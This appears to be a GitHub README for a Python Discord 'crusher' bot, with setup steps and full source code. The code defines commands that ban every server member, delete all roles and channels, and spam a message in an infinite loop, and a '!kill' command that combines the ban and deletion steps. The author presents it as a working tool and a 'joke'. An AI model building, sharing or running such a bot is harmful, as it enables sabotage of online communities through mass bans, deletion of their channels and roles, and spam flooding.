# Discord-Cracher-Python

The most common discord crusher, with basic functions
_____

## How to install and start up:

## Paste into the command line ( pip install discord.py )


![image](https://user-images.githubusercontent.com/69690887/176690106-a3ec703b-2aa5-4e50-b9b0-d75fe528604f.png)


## Run bat file

![image](https://user-images.githubusercontent.com/69690887/176689847-cb035873-c28c-4cb1-ab36-51d85ec5027c.png)


## Where to get a token? I'll prompt!

![image](https://user-images.githubusercontent.com/69690887/176691667-5bdfcd49-489c-46c0-b181-6fb5c2ff5cf8.png)

https://discord.com/developers/applications

![image](https://user-images.githubusercontent.com/69690887/176691990-1e637561-ffeb-43f3-aa26-c8627afe8c13.png)



## After creating the bot, we proceed to receive the token

![image](https://user-images.githubusercontent.com/69690887/176692106-e6cc6c5e-4b3f-4f71-a263-e0d38fb21477.png)


![image](https://user-images.githubusercontent.com/69690887/176693180-f2fccd7b-a238-4190-99dd-ab9a4677cd0a.png)


_____

##And here is your token!

![image](https://user-images.githubusercontent.com/69690887/176693544-635e68f0-d078-4a73-b669-f3042c05ffe1.png)

##Next, you paste your token into this text file

![image](https://user-images.githubusercontent.com/69690887/176693984-efbec881-1e2e-467f-bcc9-1b3eb0516821.png)

##Bot setup:

![image](https://user-images.githubusercontent.com/69690887/176694888-7c66a41d-2c15-476d-896f-ad505d94a200.png)

![image](https://user-images.githubusercontent.com/69690887/176695283-3fa9600e-3f78-4177-a9bd-f8f3035e9368.png)

![image](https://user-images.githubusercontent.com/69690887/176695441-d9c65506-7dc0-4fc8-b236-271da6991d2e.png)

## Then you add the bot to the server, write to any text chat on the server, for example:
#### !!!kill
## And your joke worked

______

#Code

```
import discord
from discord.ext import commands
import asyncio

client = discord.Client() 

client = commands.Bot(command_prefix = '!') 

@client.event
async def on_ready():
    print('Bot enabled')


@client.command()
async def up(ctx):
    await ctx.message.delete()
    for m in ctx.guild.members:
        try:
            await m.ban()
        except:
            pass

@client.command()
async def up1(ctx):
    await ctx.message.delete()
    for m in ctx.guild.roles:
        try:
            await m.delete()
        except:
            pass

@client.command()
async def up2(ctx): 
    await ctx.message.delete()
    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)

@client.command()
async def upx(ctx, arg): 
    await ctx.message.delete()

    i = 1
    while i == 1:
        await ctx.send(arg)

@client.command()
async def kill(ctx): 
    await ctx.message.delete()
    for m in ctx.guild.roles:
        try:
            await m.delete()
        except:
            pass
   
    for m in ctx.guild.members:
        try:
            await m.ban()
        except:
            pass

    failed = []
    counter = 0
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except: failed.append(channel.name)
        else: counter += 1
    fmt = ", ".join(failed)




token = open('token.txt', 'r').readline()

client.run(token) 

```
